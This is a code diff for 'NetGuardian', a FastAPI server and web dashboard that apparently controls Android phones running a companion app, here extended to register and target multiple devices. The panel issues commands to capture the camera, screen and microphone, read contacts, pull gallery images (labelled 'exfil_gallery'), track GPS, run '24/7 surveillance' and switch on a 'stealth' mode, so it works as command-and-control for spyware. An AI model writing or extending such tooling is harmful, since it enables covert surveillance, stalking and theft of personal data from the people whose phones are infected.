@@ -45,8 +45,17 @@ def init_db():
     c.execute("""CREATE TABLE IF NOT EXISTS alerts (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         type TEXT NOT NULL, message TEXT DEFAULT '',
-        source TEXT DEFAULT 'system', created_at TEXT NOT NULL
+        source TEXT DEFAULT 'system', device_id TEXT DEFAULT '',
+        created_at TEXT NOT NULL
     )""")
+    c.execute("""CREATE TABLE IF NOT EXISTS devices (
+        device_id TEXT PRIMARY KEY, device_name TEXT DEFAULT '',
+        device_ip TEXT DEFAULT '', last_seen TEXT DEFAULT '',
+        created_at TEXT NOT NULL
+    )""")
+    try:
+        c.execute("ALTER TABLE alerts ADD COLUMN device_id TEXT DEFAULT ''")
+    except: pass
     conn.commit()
     conn.close()
 
@@ -55,19 +64,53 @@ init_db()
 def db():
     return sqlite3.connect(DB)
 
+@app.post("/api/devices/register")
+async def register_device(data: dict = Body(...)):
+    device_id = data.get("device_id", "")
+    device_name = data.get("device_name", "")
+    device_ip = data.get("device_ip", "")
+    if not device_id:
+        return {"ok": False, "error": "device_id required"}
+    conn = db()
+    c = conn.cursor()
+    now = datetime.now().isoformat()
+    c.execute("""INSERT INTO devices (device_id, device_name, device_ip, last_seen, created_at)
+                 VALUES (?,?,?,?,?)
+                 ON CONFLICT(device_id) DO UPDATE SET device_name=excluded.device_name,
+                 device_ip=excluded.device_ip, last_seen=excluded.last_seen""",
+              (device_id, device_name, device_ip, now, now))
+    conn.commit()
+    conn.close()
+    return {"ok": True, "device_id": device_id}
+
+@app.get("/api/devices")
+async def list_devices():
+    conn = db()
+    c = conn.cursor()
+    rows = c.execute("SELECT * FROM devices ORDER BY last_seen DESC").fetchall()
+    conn.close()
+    devices = []
+    for r in rows:
+        last_seen = r[3] if r[3] else ""
+        is_online = False
+        if last_seen:
+            try:
+                last_dt = datetime.fromisoformat(last_seen)
+                is_online = (datetime.now() - last_dt).total_seconds() < 60
+            except: pass
+        devices.append({
+            "device_id": r[0], "device_name": r[1], "device_ip": r[2],
+            "last_seen": r[3], "created_at": r[4], "online": is_online
+        })
+    return {"devices": devices}
+
 @app.get("/", response_class=HTMLResponse)
 async def dashboard():
     global last_device_poll
     device_online = bool(last_device_poll) and (datetime.now() - last_device_poll).total_seconds() < 60
     status_text = "Device Online" if device_online else "Waiting for device"
     dot_class = "online" if device_online else "offline"
-    html = HTMLContent.replace(
-        '<span id="status-text">Unknown</span>',
-        f'<span id="status-text">{status_text}</span>'
-    ).replace(
-        'class="dot offline" id="status-dot"',
-        f'class="dot {dot_class}" id="status-dot"'
-    )
+    html = HTMLContent
     return Response(content=html, media_type="text/html",
                     headers={"Cache-Control": "no-cache, no-store, must-revalidate",
                              "Pragma": "no-cache", "Expires": "0"})
@@ -144,7 +187,7 @@ async def get_data():
         "captures": [enrich_capture(r) for r in captures],
         "contacts": [{"id":r[0],"device":r[1],"name":r[2],"phone":r[3],"email":r[4],"time":r[5]} for r in contacts],
         "commands": [{"id":r[0],"action":r[1],"target":r[2],"params":r[3],"device":r[4],"status":r[5],"result":r[6],"time":r[7]} for r in commands],
-        "alerts": [{"id":r[0],"type":r[1],"message":r[2],"source":r[3],"time":r[4]} for r in alerts]
+        "alerts": [{"id":r[0],"type":r[1],"message":r[2],"source":r[3],"device_id":r[4],"time":r[5]} for r in alerts]
     }
 
 @app.post("/api/commands")
@@ -166,6 +209,10 @@ async def get_pending(device_id: str = "", action: str = ""):
     last_device_poll = datetime.now()
     conn = db()
     c = conn.cursor()
+    if device_id:
+        now = datetime.now().isoformat()
+        c.execute("UPDATE devices SET last_seen=? WHERE device_id=?", (now, device_id))
+        conn.commit()
     c.execute("UPDATE commands SET status='failed', result='timeout' WHERE status='pending' AND created_at < ?",
               ((datetime.now() - timedelta(seconds=30)).isoformat(),))
     if c.rowcount > 0:
@@ -173,7 +220,7 @@ async def get_pending(device_id: str = "", action: str = ""):
     q = "SELECT * FROM commands WHERE status='pending'"
     args = []
     if device_id:
-        q += " AND device_id=?"
+        q += " AND (device_id=? OR device_id='')"
         args.append(device_id)
     if action:
         q += " AND action=?"
@@ -193,19 +240,24 @@ async def ack_command(id: int = Form(...), status: str = Form("done"), result: s
     return {"ok": True}
 
 latest_frame = None
+latest_frame_time = None
 CAMERA_FRAME_FILE = "latest_camera_frame.jpg"
 motion_record = False
 motion_count = 0
 _prev_frame_hash = None
+_frame_disk_counter = 0
 
 @app.post("/api/camera/frame")
 async def camera_frame(file: UploadFile = File(...)):
-    global latest_frame, motion_count, _prev_frame_hash
+    global latest_frame, latest_frame_time, motion_count, _prev_frame_hash, _frame_disk_counter
     latest_frame = await file.read()
-    try:
-        with open(CAMERA_FRAME_FILE, "wb") as f:
-            f.write(latest_frame)
-    except: pass
+    latest_frame_time = datetime.now()
+    _frame_disk_counter += 1
+    if _frame_disk_counter % 30 == 0:
+        try:
+            with open(CAMERA_FRAME_FILE, "wb") as f:
+                f.write(latest_frame)
+        except: pass
     if motion_record and latest_frame:
         import hashlib
         h = hashlib.md5(latest_frame[:5000]).digest()
@@ -243,6 +295,10 @@ async def toggle_motion(recording: bool = Form(False)):
 @app.get("/api/camera/frame.jpg")
 async def get_camera_frame():
     frame = latest_frame
+    if frame and latest_frame_time:
+        age = (datetime.now() - latest_frame_time).total_seconds()
+        if age > 5:
+            frame = None
     if not frame:
         try:
             with open(CAMERA_FRAME_FILE, "rb") as f:
@@ -252,6 +308,12 @@ async def get_camera_frame():
         return Response(content=frame, media_type="image/jpeg",
                         headers={"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Expires": "0"})
     return Response(status_code=204)
+
+@app.get("/api/camera/status")
+async def camera_status():
+    has_frame = latest_frame is not None
+    age = (datetime.now() - latest_frame_time).total_seconds() if latest_frame_time else None
+    return {"active": has_frame and age is not None and age < 5, "has_frame": has_frame, "age_seconds": age}
 
 @app.get("/uploads/{filename}")
 async def serve_upload(filename: str):
@@ -296,7 +358,23 @@ async def screen_status():
 
 async def _adb_screen_refresher():
     global screen_frame, screen_frame_mime, screen_stream_active
+    adb_ok = True
     while True:
+        if adb_ok:
+            try:
+                r = await asyncio.create_subprocess_exec(
+                    "adb", "devices", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                stdout, _ = await asyncio.wait_for(r.communicate(), timeout=5)
+                devices_line = stdout.decode()
+                has_device = len(devices_line.strip().split('\n')) > 1
+                if not has_device:
+                    adb_ok = False
+                    await asyncio.sleep(30)
+                    continue
+            except:
+                adb_ok = False
+                await asyncio.sleep(30)
+                continue
         try:
             r = await asyncio.create_subprocess_exec(
                 "adb", "exec-out", "screencap", "-p",
@@ -323,21 +401,13 @@ async def _adb_screen_refresher():
                 screen_stream_active = True
                 img.close()
         except:
-            pass
+            adb_ok = False
         await asyncio.sleep(3)
 
 @app.on_event("startup")
 async def _start_adb_refresher():
     global _adb_refresh_task
     _adb_refresh_task = asyncio.create_task(_adb_screen_refresher())
-    try:
-        conn = sqlite3.connect(DB)
-        c = conn.cursor()
-        c.execute("INSERT INTO commands (action, target, params, device_id, status, created_at) VALUES (?,?,?,?,'pending',?)",
-                  ("camera_stream", "start", "{}", "", datetime.now().isoformat()))
-        conn.commit()
-        conn.close()
-    except: pass
 
 @app.post("/api/remote/tap")
 async def remote_tap(x: float = Form(...), y: float = Form(...)):
@@ -387,8 +457,9 @@ async def remote_key(key: str = Form(...)):
 
 @app.post("/api/clear")
 async def clear_all():
-    global latest_frame, screen_frame, screen_stream_active
+    global latest_frame, latest_frame_time, screen_frame, screen_stream_active
     latest_frame = None
+    latest_frame_time = None
     screen_frame = None
     screen_stream_active = False
     conn = db()
@@ -410,8 +481,8 @@ async def clear_all():
 async def threat_alert(data: dict = Body(...)):
     conn = db()
     c = conn.cursor()
-    c.execute("INSERT INTO alerts (type, message, source, created_at) VALUES (?,?,?,?)",
-              (data.get("type",""), data.get("message",""), data.get("source","system"), datetime.now().isoformat()))
+    c.execute("INSERT INTO alerts (type, message, source, device_id, created_at) VALUES (?,?,?,?,?)",
+              (data.get("type",""), data.get("message",""), data.get("source","system"), data.get("device_id",""), datetime.now().isoformat()))
     conn.commit()
     conn.close()
     return {"ok": True, "id": c.lastrowid}
@@ -526,22 +597,21 @@ HTMLContent = """
 <style>
   * { margin:0; padding:0; box-sizing:border-box; }
   body { font-family:'Segoe UI',system-ui,-apple-system,sans-serif; background:#0f0f23; color:#c8d6e5; min-height:100vh; }
-  .header { background:#1a1a2e; padding:16px 24px; border-bottom:2px solid #4cc9f0; display:flex; justify-content:space-between; align-items:center; }
+  .header { background:#1a1a2e; padding:16px 24px; border-bottom:2px solid #4cc9f0; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px; }
   .header h1 { color:#4cc9f0; font-size:20px; }
   .header .sub { color:#576574; font-size:12px; margin-top:2px; }
-  #device-status { display:flex; align-items:center; gap:6px; font-size:13px; }
-  #device-status .dot { width:10px; height:10px; border-radius:50%; display:inline-block; }
-  #device-status .dot.online { background:#10ac84; box-shadow:0 0 6px #10ac84; }
-  #device-status .dot.offline { background:#e94560; box-shadow:0 0 6px #e94560; }
+  .header-right { display:flex; align-items:center; gap:16px; flex-wrap:wrap; }
+  .device-pills { display:flex; gap:6px; flex-wrap:wrap; }
+  .device-pill { display:flex; align-items:center; gap:5px; background:#16213e; border:1px solid #0f3460; border-radius:16px; padding:3px 10px; font-size:11px; cursor:pointer; transition:all .15s; }
+  .device-pill:hover { border-color:#4cc9f0; }
+  .device-pill.selected { border-color:#4cc9f0; background:#0f3460; }
+  .device-pill .dot { width:7px; height:7px; border-radius:50%; display:inline-block; }
+  .device-pill .dot.online { background:#10ac84; box-shadow:0 0 4px #10ac84; }
+  .device-pill .dot.offline { background:#e94560; box-shadow:0 0 4px #e94560; }
   .container { max-width:1280px; margin:0 auto; padding:16px 20px; }
-
   .section { margin-bottom:20px; }
   .section-title { display:flex; align-items:center; gap:8px; font-size:15px; font-weight:600; color:#4cc9f0; margin-bottom:10px; padding-bottom:6px; border-bottom:1px solid #1a1a2e; }
-  .section-title .badge { background:#e94560; color:#fff; padding:0 8px; border-radius:10px; font-size:11px; line-height:18px; }
-
   .card { background:#1a1a2e; border-radius:8px; padding:16px; border:1px solid #16213e; }
-  .card-cmd { background:#1a1a2e; border-radius:8px; padding:12px 16px; border:1px solid #16213e; }
-
   .btn-row { display:flex; flex-wrap:wrap; gap:6px; }
   .btn { background:#16213e; color:#4cc9f0; border:1px solid #0f3460; padding:7px 14px; border-radius:6px; cursor:pointer; font-size:12px; transition:all .15s; white-space:nowrap; }
   .btn:hover { background:#0f3460; border-color:#4cc9f0; }
@@ -553,12 +623,12 @@ HTMLContent = """
   .btn.danger:hover { background:#d63851; }
   .btn.success { background:#10ac84; color:#fff; border-color:#10ac84; }
   .btn.success:hover { background:#0e9d78; }
-
-  .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:10px; margin-bottom:20px; }
+  .btn.broadcast { background:#feca57; color:#000; border-color:#feca57; font-weight:600; }
+  .btn.broadcast:hover { background:#f0b723; }
+  .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(100px,1fr)); gap:10px; margin-bottom:20px; }
   .stat-card { background:#1a1a2e; border-radius:8px; padding:14px; text-align:center; border:1px solid #16213e; }
   .stat-card .num { font-size:26px; font-weight:700; color:#4cc9f0; font-family:monospace; }
   .stat-card .label { font-size:11px; color:#576574; margin-top:2px; text-transform:uppercase; letter-spacing:.5px; }
-
   .capture-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(240px,1fr)); gap:12px; }
   .capture-item { background:#1a1a2e; border-radius:8px; overflow:hidden; border:1px solid #16213e; transition:border-color .2s; }
   .capture-item:hover { border-color:#4cc9f0; }
@@ -568,7 +638,6 @@ HTMLContent = """
   .capture-item .info .time { color:#576574; font-size:10px; font-family:monospace; }
   .capture-item .audio-preview { padding:8px; }
   .capture-item .audio-preview audio { width:100%; height:32px; }
-
   .cmd-list { display:flex; flex-direction:column; gap:2px; }
   .cmd-row { display:flex; align-items:center; gap:8px; padding:5px 0; border-bottom:1px solid #16213e; font-size:12px; font-family:monospace; }
   .cmd-row:last-child { border-bottom:none; }
@@ -580,33 +649,28 @@ HTMLContent = """
   .cmd-row .status.failed { color:#e94560; }
   .cmd-row .res { color:#576574; font-size:11px; }
   .cmd-row .time { color:#576574; font-size:10px; margin-left:auto; white-space:nowrap; }
-
   .contact-row { display:flex; flex-wrap:wrap; gap:4px; }
   .contact-chip { background:#16213e; border-radius:16px; padding:3px 10px; font-size:11px; border:1px solid #0f3460; }
   .contact-chip .name { color:#c8d6e5; }
   .contact-chip .detail { color:#576574; font-size:10px; }
-
   .livecam-wrapper { position:relative; }
   .livecam-wrapper img { width:100%; max-height:480px; object-fit:contain; border-radius:6px; border:2px solid #4cc9f0; background:#000; }
   .livecam-overlay { position:absolute; top:8px; left:8px; display:flex; gap:6px; align-items:center; }
   .livecam-dot { width:8px; height:8px; background:#10ac84; border-radius:50%; animation:pulse 1.2s infinite; }
   @keyframes pulse { 0%{opacity:1} 50%{opacity:.3} 100%{opacity:1} }
   .livecam-label { background:rgba(0,0,0,.7); color:#10ac84; font-size:11px; padding:2px 8px; border-radius:4px; font-weight:600; }
-
   .toast { position:fixed; bottom:24px; right:24px; background:#4cc9f0; color:#000; padding:12px 20px; border-radius:8px; font-weight:600; z-index:999; transform:translateY(80px); opacity:0; transition:all .3s; font-size:13px; }
   .toast.show { transform:translateY(0); opacity:1; }
-
   .search-box { background:#16213e; border:1px solid #0f3460; border-radius:6px; padding:6px 12px; color:#c8d6e5; font-size:13px; width:100%; margin-bottom:10px; outline:none; transition:border-color .2s; }
   .search-box:focus { border-color:#4cc9f0; }
-
   .empty-state { text-align:center; padding:24px; color:#576574; font-size:13px; }
-
-  .tab-bar { display:flex; gap:2px; margin-bottom:12px; }
+  .tab-bar { display:flex; gap:2px; margin-bottom:12px; flex-wrap:wrap; }
   .tab { background:#16213e; color:#576574; padding:6px 16px; border-radius:6px 6px 0 0; cursor:pointer; font-size:12px; border:1px solid #16213e; border-bottom:2px solid transparent; transition:all .2s; }
   .tab:hover { color:#c8d6e5; }
   .tab.active { background:#1a1a2e; color:#4cc9f0; border-color:#0f3460; border-bottom-color:#4cc9f0; }
   .tab-content { display:none; }
   .tab-content.active { display:block; }
+  .target-badge { display:inline-block; background:#0f3460; color:#4cc9f0; border:1px solid #4cc9f0; border-radius:12px; padding:2px 10px; font-size:11px; margin-bottom:8px; }
 </style>
 </head>
 <body>
@@ -615,11 +679,18 @@ HTMLContent = """
     <h1>NetGuardian</h1>
     <div class="sub">Remote device control & monitoring</div>
   </div>
-  <div id="device-status"><span class="dot offline" id="status-dot"></span><span id="status-text">Unknown</span></div>
+  <div class="header-right">
+    <div id="backend-status" style="display:flex;align-items:center;gap:6px;font-size:11px;padding:4px 10px;border-radius:12px;border:1px solid #10ac84;color:#10ac84;background:rgba(16,172,132,0.1);">
+      <span class="dot online" style="width:7px;height:7px;border-radius:50%;background:#10ac84;display:inline-block;"></span>Backend Connected
+    </div>
+    <div class="device-pills" id="header-pills"></div>
+  </div>
 </div>
 <div class="container">
 
   <div class="stats" id="stats"></div>
+
+  <div id="target-bar" style="margin-bottom:12px;"></div>
 
   <div class="card" style="margin-bottom:16px;">
     <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
@@ -631,13 +702,6 @@ HTMLContent = """
       <button class="btn danger" onclick="sendCmd('camera_stream','stop');stopLiveCam();">Stop Camera</button>
       <button class="btn primary" onclick="sendCmd('trigger_capture','camera')">Capture Camera</button>
       <button class="btn primary" onclick="sendCmd('trigger_capture','screen')">Capture Screen</button>
-      <button class="btn primary" onclick="sendCmd('request_permission','camera')">Grant Camera</button>
-      <button class="btn primary" onclick="sendCmd('request_permission','microphone')">Grant Mic</button>
-      <button class="btn primary" onclick="sendCmd('request_permission','contacts')">Grant Contacts</button>
-      <button class="btn primary" onclick="sendCmd('request_permission','sms')">Grant SMS</button>
-      <button class="btn primary" onclick="sendCmd('request_permission','call_log')">Grant Call Log</button>
-      <button class="btn primary" onclick="sendCmd('request_permission','gallery')">Grant Gallery</button>
-      <button class="btn primary" onclick="sendCmd('request_permission','location')">Grant Location</button>
       <button class="btn primary" onclick="sendCmd('trigger_capture','audio')">Record Audio</button>
       <button class="btn primary" onclick="sendCmd('trigger_capture','contacts')">Read Contacts</button>
       <button class="btn danger" onclick="sendCmd('open_settings','')">App Settings</button>
@@ -678,7 +742,8 @@ HTMLContent = """
   </div>
 
   <div class="tab-bar">
-    <div class="tab active" data-tab="captures" onclick="switchTab('captures')">Captures <span id="capture-count" style="color:#e94560;">0</span></div>
+    <div class="tab active" data-tab="devices" onclick="switchTab('devices')">Devices <span id="device-count" style="color:#e94560;">0</span></div>
+    <div class="tab" data-tab="captures" onclick="switchTab('captures')">Captures <span id="capture-count" style="color:#e94560;">0</span></div>
     <div class="tab" data-tab="contacts" onclick="switchTab('contacts')">Contacts <span id="contact-count" style="color:#e94560;">0</span></div>
     <div class="tab" data-tab="commands" onclick="switchTab('commands')">Commands</div>
     <div class="tab" data-tab="screen" onclick="switchTab('screen')">Screen</div>
@@ -688,7 +753,11 @@ HTMLContent = """
     <button class="btn btn-danger" onclick="clearAll()" style="padding:4px 10px;font-size:11px;">Clear All</button>
   </div>
 
-  <div class="tab-content active" id="tab-captures">
+  <div class="tab-content active" id="tab-devices">
+    <div id="devices"></div>
+  </div>
+
+  <div class="tab-content" id="tab-captures">
     <div id="captures"></div>
   </div>
 
@@ -719,55 +788,55 @@ HTMLContent = """
     </div>
   </div>
 
-    <div class="tab-content" id="tab-surveillance">
-      <div class="card" style="margin-bottom:16px;">
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
-          <h3 style="color:#4cc9f0;font-size:14px;">24/7 Surveillance Mode</h3>
-          <span id="surveillance-status" style="font-size:11px;padding:2px 8px;border-radius:4px;font-weight:600;">Offline</span>
+  <div class="tab-content" id="tab-surveillance">
+    <div class="card" style="margin-bottom:16px;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+        <h3 style="color:#4cc9f0;font-size:14px;">24/7 Surveillance Mode</h3>
+        <span id="surveillance-status" style="font-size:11px;padding:2px 8px;border-radius:4px;font-weight:600;">Offline</span>
+      </div>
+      <div class="btn-row" style="margin-bottom:10px;">
+        <button class="btn success" onclick="sendCmd('surveillance','start')">Start Surveillance</button>
+        <button class="btn btn-danger" onclick="sendCmd('surveillance','stop')">Stop Surveillance</button>
+        <button class="btn" onclick="sendCmd('surveillance','motion_on')">Motion ON</button>
+        <button class="btn" onclick="sendCmd('surveillance','motion_off')">Motion OFF</button>
+        <button class="btn primary" onclick="sendCmd('surveillance','video_on')">Video ON</button>
+        <button class="btn" onclick="sendCmd('surveillance','video_off')">Video OFF</button>
+        <button class="btn primary" onclick="sendCmd('surveillance','audio_on')">MIC ON</button>
+        <button class="btn" onclick="sendCmd('surveillance','audio_off')">MIC OFF</button>
+        <button class="btn" onclick="sendCmd('surveillance','camera_front')">Selfie Cam</button>
+        <button class="btn" onclick="sendCmd('surveillance','camera_back')">Main Cam</button>
+        <button class="btn" onclick="sendCmd('record_video','30')">Record 30s</button>
+        <button class="btn success" onclick="sendCmd('surveillance','tracking_on')">GPS ON</button>
+        <button class="btn" onclick="sendCmd('surveillance','tracking_off')">GPS OFF</button>
+        <button class="btn" onclick="sendCmd('stealth','on')">Stealth ON</button>
+        <button class="btn" onclick="sendCmd('stealth','off')">Stealth OFF</button>
+      </div>
+      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:8px;margin-bottom:8px;">
+        <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
+          <div style="font-size:11px;color:#576574;">Motion Alerts</div>
+          <div id="motion-count" style="font-size:20px;font-weight:700;color:#feca57;font-family:monospace;">0</div>
         </div>
-        <div class="btn-row" style="margin-bottom:10px;">
-          <button class="btn success" onclick="sendCmd('surveillance','start')">Start Surveillance</button>
-          <button class="btn btn-danger" onclick="sendCmd('surveillance','stop')">Stop Surveillance</button>
-          <button class="btn" onclick="sendCmd('surveillance','motion_on')">Motion ON</button>
-          <button class="btn" onclick="sendCmd('surveillance','motion_off')">Motion OFF</button>
-          <button class="btn primary" onclick="sendCmd('surveillance','video_on')">Video ON</button>
-          <button class="btn" onclick="sendCmd('surveillance','video_off')">Video OFF</button>
-          <button class="btn primary" onclick="sendCmd('surveillance','audio_on')">MIC ON</button>
-          <button class="btn" onclick="sendCmd('surveillance','audio_off')">MIC OFF</button>
-          <button class="btn" onclick="sendCmd('surveillance','camera_front')">Selfie Cam</button>
-          <button class="btn" onclick="sendCmd('surveillance','camera_back')">Main Cam</button>
-          <button class="btn" onclick="sendCmd('record_video','30')">Record 30s</button>
-          <button class="btn success" onclick="sendCmd('surveillance','tracking_on')">GPS ON</button>
-          <button class="btn" onclick="sendCmd('surveillance','tracking_off')">GPS OFF</button>
-          <button class="btn" onclick="sendCmd('stealth','on')">Stealth ON</button>
-          <button class="btn" onclick="sendCmd('stealth','off')">Stealth OFF</button>
+        <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
+          <div style="font-size:11px;color:#576574;">Status</div>
+          <div id="surveillance-detail" style="font-size:12px;color:#576574;">--</div>
         </div>
-        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:8px;margin-bottom:8px;">
-          <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
-            <div style="font-size:11px;color:#576574;">Motion Alerts</div>
-            <div id="motion-count" style="font-size:20px;font-weight:700;color:#feca57;font-family:monospace;">0</div>
-          </div>
-          <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
-            <div style="font-size:11px;color:#576574;">Status</div>
-            <div id="surveillance-detail" style="font-size:12px;color:#576574;">--</div>
-          </div>
-          <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
-            <div style="font-size:11px;color:#576574;">Motion Detection</div>
-            <div id="motion-state" style="font-size:12px;color:#576574;">--</div>
-          </div>
-          <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
-            <div style="font-size:11px;color:#576574;">GPS Tracking</div>
-            <div id="tracking-state" style="font-size:12px;color:#576574;">--</div>
-          </div>
-          <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
-            <div style="font-size:11px;color:#576574;">Stealth</div>
-            <div id="stealth-state" style="font-size:12px;color:#576574;">--</div>
-          </div>
+        <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
+          <div style="font-size:11px;color:#576574;">Motion Detection</div>
+          <div id="motion-state" style="font-size:12px;color:#576574;">--</div>
+        </div>
+        <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
+          <div style="font-size:11px;color:#576574;">GPS Tracking</div>
+          <div id="tracking-state" style="font-size:12px;color:#576574;">--</div>
+        </div>
+        <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
+          <div style="font-size:11px;color:#576574;">Stealth</div>
+          <div id="stealth-state" style="font-size:12px;color:#576574;">--</div>
         </div>
       </div>
-      <div class="section-title">Motion Alerts</div>
-      <div id="alerts"></div>
     </div>
+    <div class="section-title">Motion Alerts</div>
+    <div id="alerts"></div>
+  </div>
 
   <div class="tab-content" id="tab-files">
     <div class="card" style="margin-bottom:12px;">
@@ -810,6 +879,11 @@ function switchTab(name) {
   document.querySelectorAll('.tab-content').forEach(t=>t.classList.toggle('active',t.id==='tab-'+name));
 }
 
+let selectedDeviceId = '';
+let ALL_DEVICES = [];
+
+function sanitizeId(s) { return s.replace(/[^a-zA-Z0-9_-]/g, '_'); }
+
 async function sendCmd(action, target) {
   const el=document.getElementById('cmd-sending');
   el.style.display='inline';
@@ -817,13 +891,79 @@ async function sendCmd(action, target) {
     const r=await fetch('/api/commands',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({action,target,params:'{}',device_id:''})
+      body:JSON.stringify({action,target,params:'{}',device_id:selectedDeviceId})
     });
     const d=await r.json();
-    if (d.ok) toast('Command sent (#'+d.id+')');
+    if (d.ok) toast('Command sent (#'+d.id+')'+(selectedDeviceId?' to '+selectedDeviceId.substring(0,8)+'...':' [ALL]'));
     else toast('Failed to send command');
   } catch(e) { toast('Error: '+e.message); }
   finally { el.style.display='none'; }
+}
+
+function selectDevice(id) {
+  selectedDeviceId = (selectedDeviceId === id) ? '' : id;
+  renderTargetBar();
+  renderHeaderPills();
+  document.querySelectorAll('.device-card').forEach(c => {
+    c.style.borderColor = c.dataset.did === selectedDeviceId ? '#4cc9f0' : '#16213e';
+  });
+  toast(selectedDeviceId ? 'Targeting: '+selectedDeviceId.substring(0,12)+'...' : 'Targeting: ALL devices');
+}
+
+function renderHeaderPills() {
+  const el = document.getElementById('header-pills');
+  const onlineCount = ALL_DEVICES.filter(d=>d.online).length;
+  let html = '<div class="device-pill'+(selectedDeviceId==='')+'" onclick="selectDevice(\\'\\')"><span class="dot '+(onlineCount>0?'online':'offline')+'"></span>ALL ('+ALL_DEVICES.length+')</div>';
+  ALL_DEVICES.forEach(d => {
+    const name = (d.device_name||'Unknown').split(' ').slice(-1)[0];
+    const isSelected = d.device_id === selectedDeviceId;
+    html += '<div class="device-pill'+(isSelected?' selected':'')+'" onclick="selectDevice(\\''+d.device_id+'\\')"><span class="dot '+(d.online?'online':'offline')+'"></span>'+name+'</div>';
+  });
+  el.innerHTML = html;
+}
+
+function renderTargetBar() {
+  const el = document.getElementById('target-bar');
+  if (!selectedDeviceId) {
+    el.innerHTML = '<span class="target-badge">Broadcasting to ALL devices</span>';
+  } else {
+    const dev = ALL_DEVICES.find(d=>d.device_id===selectedDeviceId);
+    const name = dev ? (dev.device_name||selectedDeviceId.substring(0,12)) : selectedDeviceId.substring(0,12);
+    el.innerHTML = '<span class="target-badge">Targeting: '+name+' ('+(dev?dev.device_ip:'')+') <span style="cursor:pointer;color:#e94560;" onclick="selectDevice(\\'\\')">[x]</span></span>';
+  }
+}
+
+function renderDevices(devices) {
+  const el = document.getElementById('devices');
+  document.getElementById('device-count').textContent = devices.length;
+  if (!devices.length) {
+    el.innerHTML = '<div class="empty-state"><div style="font-size:32px;margin-bottom:8px;">No devices found</div>Install the app on a phone to register it here.<br>Commands will be sent to all connected devices.</div>';
+    return;
+  }
+  el.innerHTML = devices.map(d => {
+    const sc = d.online ? '#10ac84' : '#e94560';
+    const st = d.online ? 'ONLINE' : 'OFFLINE';
+    const sid = d.device_id.substring(0,12);
+    const sel = d.device_id === selectedDeviceId;
+    const bc = sel ? '#4cc9f0' : '#16213e';
+    const devIcon = (d.device_name||'').includes('Samsung') ? 'Samsung' : (d.device_name||'').includes('Pixel') ? 'Pixel' : (d.device_name||'').includes('Xiaomi') ? 'Xiaomi' : 'Phone';
+    return '<div class="card device-card" data-did="'+d.device_id+'" style="margin-bottom:8px;border:2px solid '+bc+';cursor:pointer;transition:border-color .2s;" onclick="selectDevice(\\''+d.device_id+'\\')">'
+      +'<div style="display:flex;justify-content:space-between;align-items:center;">'
+      +'<div style="display:flex;align-items:center;gap:12px;">'
+      +'<div style="width:42px;height:42px;border-radius:10px;background:#0f3460;display:flex;align-items:center;justify-content:center;font-size:20px;">📱</div>'
+      +'<div>'
+      +'<div style="font-size:14px;font-weight:600;color:#c8d6e5;">'+(d.device_name||'Unknown Device')+'</div>'
+      +'<div style="font-size:12px;color:#576574;margin-top:2px;">IP: <span style="color:#4cc9f0;">'+(d.device_ip||'unknown')+'</span> &middot; ID: <span style="color:#576574;">'+sid+'...</span></div>'
+      +'<div style="font-size:11px;color:#576574;margin-top:1px;">Last seen: '+(d.last_seen?d.last_seen.slice(0,16).replace('T',' '):'Never')+'</div>'
+      +'</div>'
+      +'</div>'
+      +'<div style="text-align:right;">'
+      +'<span style="display:inline-block;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:600;background:'+sc+'22;color:'+sc+';border:1px solid '+sc+'44;">'+st+'</span>'
+      +(sel?'<div style="font-size:10px;color:#4cc9f0;margin-top:4px;font-weight:600;">TARGETED</div>':'')
+      +'</div>'
+      +'</div>'
+      +'</div>';
+  }).join('');
 }
 
 const ALL_CONTACTS = [];
@@ -837,29 +977,30 @@ function renderCaptures(caps) {
     const ext=src?src.split('.').pop().toLowerCase():'';
     let media='';
     if (c.type==='surveillance_video') {
-      media=`<video class="thumb" src="${src}" controls preload="metadata" style="cursor:pointer;object-fit:contain;background:#000;"></video>`;
+      media='<video class="thumb" src="'+src+'" controls preload="metadata" style="cursor:pointer;object-fit:contain;background:#000;"></video>';
     } else if (c.type==='surveillance_audio') {
-      media=`<div class="audio-preview"><audio controls src="${src}" style="width:100%;"></audio></div>`;
+      media='<div class="audio-preview"><audio controls src="'+src+'" style="width:100%;"></audio></div>';
     } else if (c.type==='surveillance_motion'||c.type==='exfil_gallery') {
-      if (src&&(ext==='jpg'||ext==='jpeg'||ext==='png')) media=`<img class="thumb" src="${src}" loading="lazy" onclick="window.open('${src}','_blank')" style="cursor:pointer" />`;
-      else media=`<div style="height:160px;display:flex;align-items:center;justify-content:center;color:#576574;font-size:11px;">No preview</div>`;
+      if (src&&(ext==='jpg'||ext==='jpeg'||ext==='png')) media='<img class="thumb" src="'+src+'" loading="lazy" onclick="window.open(\\''+src+'\\',\\'_blank\\')" style="cursor:pointer" />';
+      else media='<div style="height:160px;display:flex;align-items:center;justify-content:center;color:#576574;font-size:11px;">No preview</div>';
     } else if (c.type==='surveillance_location') {
